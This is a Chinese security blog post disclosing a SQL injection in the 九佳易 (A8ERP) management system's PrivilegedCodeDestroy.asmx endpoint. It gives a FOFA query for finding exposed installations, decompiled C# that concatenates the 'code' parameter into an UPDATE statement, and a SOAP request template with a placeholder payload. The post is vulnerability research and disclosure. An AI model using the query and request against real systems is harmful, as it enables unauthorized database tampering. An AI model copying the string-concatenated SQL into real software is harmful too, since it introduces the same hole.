---
title: "九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞"
source: https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html
asset_dir: assets/九佳易管理系统-privilegedcodedestroy.asmx-sql注入漏洞
---

# 九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/3/1 08:35
- 230浏览
- [0评论](#comment)
- 20分钟阅读

深入探索

SQL

应用程序接口

客户端

---

# 漏洞简介

九佳易系统管理系统中的 PrivilegedCodeDestroy.asmx 通用处理程序接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，该接口主要用于处理前端 AJAX 请求并与后端数据库进行交互。由于接口未对客户端传入的关键参数进行严格的输入校验、参数化处理或特殊字符转义，攻击者可通过构造恶意的 SQL 语句片段注入到请求参数中，使后端数据库执行非授权的 SQL 操作，进而窃取、篡改甚至销毁数据库中的敏感数据。

SQL注入检测工具

# 影响版本

# fofa语法

> title="VSQL" && body="/Scripts/Login\_A8/"

# 漏洞分析

根据 Interface/licx/PrivilegedCodeDestroy.asmx 的代码引用

```
<%@ WebService Language="C#" CodeBehind="PrivilegedCodeDestroy.asmx.cs" Class="A8ERP.Interface.licx.PrivilegedCodeDestroy" %>
```

找到 A8ERP.Interface.licx.PrivilegedCodeDestroy 相关类的实现逻辑

代码安全审计

```
using System;
using System.ComponentModel;
using System.Data.Common;
using System.Web.Services;

#nullable disable
namespace A8ERP.Interface.licx;

[WebService(Namespace = "http://tempuri.org/")]
[ToolboxItem(false)]
[WebServiceBinding]
public class PrivilegedCodeDestroy : WebService
{
  [WebMethod]
  public string UpdatePrivilegedState(string code)
  {
    DBHelp dbHelp = new DBHelp();
    dbHelp.Open();
    try
    {
      string sql = $"UPDATE privileged_state SET zt='1' WHERE code='{code}'";
      ((DbCommand) dbHelp.GetCommand(sql)).ExecuteNonQuery();
    }
    catch (Exception ex)
    {
    }
    finally
    {
      dbHelp.Close();
    }
    return "";
  }
}
```

深入探索

JSON处理工具

安全研究工具

在线安全工具

非常明显拼接导致的SQL注入，参数code无任何过滤或校验被直接拼接到`$"UPDATE privileged_state SET zt='1' WHERE code='{code}'";`sql语句中，然后调用`dbHelp.GetCommand(sql)).ExecuteNonQuery()`方法进行执行，从而造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

> 因为参数获取是通过`this.Request["hyh"]`的方式，因此支持get、post等常规方式外，还支持multipart格式
>
> 漏洞修复方案

```
POST /Interface/licx/PrivilegedCodeDestroy.asmx HTTP/1.1
SOAPAction: http://tempuri.org/UpdatePrivilegedState
Content-Type: text/xml;charset=UTF-8
Host: a8erp.mrxn.net

<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
   <soap:Header/>
   <soap:Body>
      <tem:UpdatePrivilegedState>
         <!--type: string-->
         <tem:code>SQLI_POC</tem:code>
      </tem:UpdatePrivilegedState>
   </soap:Body>
</soap:Envelope>
```

[![九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](images/img-001-8ff688821274.webp)](https://image.mrxn.net/8c599956db92414a9b0492bb82cbf26d.webp)

成功延时 5 秒

编程

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
